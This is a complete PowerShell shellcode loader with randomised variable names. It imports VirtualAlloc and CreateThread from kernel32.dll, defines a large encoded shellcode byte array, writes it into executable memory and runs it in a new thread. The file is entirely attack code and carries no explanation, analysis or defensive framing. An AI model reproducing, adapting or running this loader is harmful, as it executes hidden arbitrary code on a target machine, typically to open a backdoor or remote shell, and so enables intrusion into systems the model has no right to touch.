$wULzPGcjXIOI = @"
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
"@

$NcUxmSVqNNcl = Add-Type -memberDefinition $wULzPGcjXIOI -Name "Win32" -namespace Win32Functions -passthru

[Byte[]] $JoSVKXEabzbjThE = 0xda,0xd9,0xbd,0x94,0x65,0x3d,0xaf,0xd9,0x74,0x24,0xf4,0x5a,0x29,0xc9,0xb1,0xa3,0x31,0x6a,0x17,0x3,0x6a,0x17,0x83,0x7e,0x99,0xdf,0x5a,0x82,0x2a,0xa3,0x41,0x8a,0x43,0x6f,0x89,0x6a,0x94,0x31,0xdb,0x2b,0xc4,0xe3,0x8a,0xfd,0xac,0x32,0xff,0x64,0x65,0xbe,0xad,0x6,0x3d,0x4b,0x3,0xde,0xf5,0xc0,0xf6,0xfe,0x48,0xe6,0x3f,0xb6,0x5d,0xbf,0x8a,0xc,0x2a,0x34,0x78,0xc0,0xe2,0x7b,0xbd,0x4c,0xce,0x1a,0x41,0x8e,0x3,0xfd,0xf8,0x4f,0x92,0xf0,0xbb,0x4e,0xe4,0xe9,0xd1,0x2,0xae,0x66,0x7b,0x82,0xa5,0x3b,0x40,0x8a,0xb8,0x6b,0xf9,0x5b,0xdd,0xa,0x82,0x43,0x2a,0xf,0x7c,0xf6,0x5e,0xf,0x82,0xf8,0x15,0x8f,0xa,0xf8,0x29,0x90,0x42,0x7d,0xe9,0xe4,0x35,0x35,0xeb,0xd4,0xfe,0x4e,0xab,0xf4,0x75,0x18,0x34,0xbc,0x88,0x48,0x14,0xdd,0xdd,0x25,0xa4,0xe8,0xaa,0x4a,0xf,0xab,0xa1,0x80,0x18,0x64,0xb7,0x3e,0x50,0x44,0x77,0xff,0xa0,0x6f,0x7a,0x53,0x63,0x71,0x44,0x93,0x84,0x4,0xb7,0xaf,0x47,0xab,0x13,0x27,0xd,0xa,0x8d,0x42,0x55,0x34,0x69,0x27,0x25,0xe1,0x38,0x36,0x76,0x8f,0xfb,0xb3,0x7a,0x18,0xb8,0x48,0xc2,0x84,0x9,0x4f,0x13,0xf5,0x2,0x4b,0x1b,0xbe,0x15,0x83,0x5a,0x67,0x57,0x7b,0x3,0xce,0xd,0x3a,0xe3,0xb1,0xe8,0xfd,0x49,0x7a,0x88,0x11,0x4d,0x3b,0xdc,0x16,0x6e,0xe3,0xa1,0xb1,0x35,0x5c,0xa9,0x53,0x23,0x17,0x52,0xac,0x4c,0xf5,0xe4,0x63,0x68,0x55,0xbc,0x3d,0xf9,0x33,0x50,0x28,0x68,0xa1,0xd8,0xaa,0x35,0x7f,0x69,0x23,0x54,0x36,0xae,0xf1,0xdb,0xbe,0x16,0xf2,0x1c,0x95,0x4,0xaf,0xaa,0x9f,0x4a,0x1c,0x71,0xed,0xbd,0x62,0xc8,0xdc,0x74,0x31,0x80,0x57,0x3d,0x8f,0x70,0x11,0xe6,0xef,0x7c,0xe1,0xe8,0x10,0xa9,0x9,0xe7,0xee,0x52,0xca,0xc9,0xd9,0x63,0xe4,0x1b,0x10,0xaa,0xca,0x69,0x68,0x9c,0x18,0xbe,0xb8,0xe0,0x6,0xf6,0x49,0x21,0xff,0xc1,0x89,0x19,0x1,0xce,0x9,0x13,0x33,0x7,0x5a,0xf8,0x59,0x94,0xf,0xb7,0x27,0xcd,0x26,0xd8,0x9e,0xf2,0x38,0xe7,0x1e,0xc,0xed,0xf,0x40,0xf2,0xd,0xd0,0x52,0xab,0x3b,0xa8,0xc1,0x79,0x10,0x3b,0x2d,0x4b,0xc2,0xdd,0x9,0x82,0x9e,0x43,0xff,0x90,0x2f,0xc1,0xc7,0xe,0x8e,0x85,0x71,0xc3,0x76,0x4f,0x3b,0x58,0xf,0x1c,0x9c,0xf,0xd6,0xd5,0x49,0x9d,0x7b,0x59,0xdf,0xa5,0x16,0x6a,0x8a,0x3,0x86,0xac,0x59,0xe3,0x64,0x94,0xc6,0x99,0xbf,0x65,0x40,0x2e,0xda,0x18,0x37,0x8d,0x52,0xae,0xc3,0x60,0xd1,0x61,0x62,0xc9,0xd5,0xe9,0x1c,0xf5,0x54,0xda,0x89,0x35,0x32,0x6f,0x2,0xe,0xf1,0xbf,0xf9,0x2b,0x63,0xae,0xce,0xd2,0x1c,0x4a,0x5,0x15,0xaa,0x1b,0xa4,0x46,0x70,0x5d,0x7f,0x24,0xb5,0x94,0x2c,0xfe,0xd,0x26,0xe1,0x56,0xe9,0x27,0x5,0xa7,0xf1,0x77,0x56,0xf4,0xb8,0xb0,0x9a,0x11,0x6f,0x11,0x20,0x19,0x5a,0x25,0xdf,0x23,0xe,0xbc,0x80,0xe3,0x47,0x31,0x54,0xeb,0xd,0xe0,0xc1,0x93,0x82,0x4,0x12,0xdd,0x6d,0xe4,0x78,0xd9,0x2c,0xbc,0x35,0x5b,0xdb,0x78,0x58,0x1d,0x23,0x85,0x64,0x22,0xdc,0x50,0x29,0x13,0xe2,0x8,0xe8,0x1b,0x6b,0x5f,0x41,0xad,0xa2,0xed,0x6b,0x4,0x67,0xbd,0xc2,0x51,0x45,0x6c,0xd3,0x45,0x32,0x90,0xe,0xf0,0x4,0x1b,0xae,0xb3,0x43,0x25,0x58,0x50,0x4b,0xa6,0x10,0xed,0xf,0x56,0x97,0xf1,0x8f,0x96,0xd8,0xf1,0x70,0x43,0x90,0xe,0x41,0x18,0x23,0x1a,0xf7,0x9,0x76,0xdc,0x7,0xca,0x2a,0x85,0x6d,0x8a,0x96,0x7c,0xf8,0xdb,0xe6,0x9d,0xea,0x92,0x2f,0xa1,0xa,0x35,0xb0,0x22,0x43,0x8f,0xe8,0x86,0x0,0xa,0x8,0xc7,0xa6,0xd4,0xf6,0x12,0xee,0x47,0x5b,0xce,0xa6,0xee,0xbb,0xb8,0xbf,0x0,0xb,0xb0,0x65,0xab,0x4b,0x2,0x99,0xc,0x54,0x83,0xd0,0xc5,0xad,0xca,0x58,0xc7,0xdb,0x44,0x7e,0xe8,0xe3,0x56,0x7e,0x16,0x36,0x1e,0xfd,0x2c,0x99,0x1a,0xc1,0xd9,0x68,0x42,0x4a,0x26,0xc5,0x8a,0x8f,0xac,0x15,0xf9,0xdd,0xf7,0x56,0x5a,0x8b,0x7,0x0,0x12,0x8c,0xca,0x42,0x11,0xb0,0x9d,0x5d,0x8f


$oyOTHRcI = $NcUxmSVqNNcl::VirtualAlloc(0,[Math]::Max($JoSVKXEabzbjThE.Length,0x1000),0x3000,0x40)

[System.Runtime.InteropServices.Marshal]::Copy($JoSVKXEabzbjThE,0,$oyOTHRcI,$JoSVKXEabzbjThE.Length)

$NcUxmSVqNNcl::CreateThread(0,0,$oyOTHRcI,0,0,0)
